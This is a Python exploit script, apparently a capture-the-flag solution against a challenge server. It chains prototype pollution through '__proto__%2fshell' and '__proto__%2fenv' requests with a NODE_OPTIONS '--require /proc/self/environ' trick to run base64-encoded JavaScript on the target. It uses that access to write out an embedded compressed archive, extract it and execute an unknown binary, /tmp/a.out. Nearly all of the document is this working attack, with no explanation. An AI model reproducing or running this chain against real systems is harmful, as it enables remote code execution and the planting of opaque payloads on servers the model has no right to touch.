
import requests
from base64 import b64encode as b6


mf = "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"

url = "https://7b000000e21f985f6f93eaab.challenges.broker2.allesctf.net:1337"
# url = "http://127.0.0.1:1337"

exp = b6("""
	fs = require('fs');
	fs.writeFileSync("/tmp/sol.tar.b64","{}");

""".format(mf))


r1 = requests.put("{}/api/directory/__proto__%2fshell".format(url), json={ "value": "/usr/local/bin/node" })
r2 = requests.put("{}/api/directory/__proto__%2fenv".format(url), json = { "value":{ "AAA":"console.log(eval(Buffer.from('{}','base64').toString()))//".format(exp), "NODE_OPTIONS":"--require /proc/self/environ" }})

print("trying cmd")

r3 = requests.get("{}/_debug/stats".format(url))
print r3.text

print "---------------------------------------------------------------------------------------------------"

exp = b6("""
	fs = require('fs');
	data = fs.readFileSync("/tmp/sol.tar.b64").toString();
	fs.writeFileSync("/tmp/sol.tar",Buffer.from(data,'base64'))
""")


r4 = requests.put("{}/api/directory/__proto__%2fenv".format(url), json = { "value":{ "AAA":"console.log(eval(Buffer.from('{}','base64').toString()))//".format(exp), "NODE_OPTIONS":"--require /proc/self/environ" }})
r5 = requests.get("{}/_debug/stats".format(url))
print r5.text


print "---------------------------------------------------------------------------------------------------"


exp = b6("""
	require('child_process').execSync('tar -zxvf /tmp/sol.tar  -C  /tmp/').toString();
""")


r4 = requests.put("{}/api/directory/__proto__%2fenv".format(url), json = { "value":{ "AAA":"console.log(eval(Buffer.from('{}','base64').toString()))//".format(exp), "NODE_OPTIONS":"--require /proc/self/environ" }})
r5 = requests.get("{}/_debug/stats".format(url))
print r5.text



print "---------------------------------------------------------------------------------------------------"


exp = b6("""
	require('child_process').execSync('/tmp/a.out').toString();
""")


r4 = requests.put("{}/api/directory/__proto__%2fenv".format(url), json = { "value":{ "AAA":"console.log(eval(Buffer.from('{}','base64').toString()))//".format(exp), "NODE_OPTIONS":"--require /proc/self/environ" }})
r5 = requests.get("{}/_debug/stats".format(url))
print r5.text



